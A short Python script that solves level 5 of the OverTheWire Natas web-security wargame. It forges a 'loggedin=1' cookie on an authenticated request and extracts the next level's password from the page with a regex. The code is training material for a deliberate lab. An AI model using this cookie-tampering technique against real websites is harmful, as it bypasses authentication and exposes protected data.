import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '5'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas5', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    #Need to change "loggedin" cookie value to 1 to beat level
    cookie = {'loggedin':'1'}
    r = requests.get('http://natas5.natas.labs.overthewire.org/', auth=auth, cookies=cookie)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
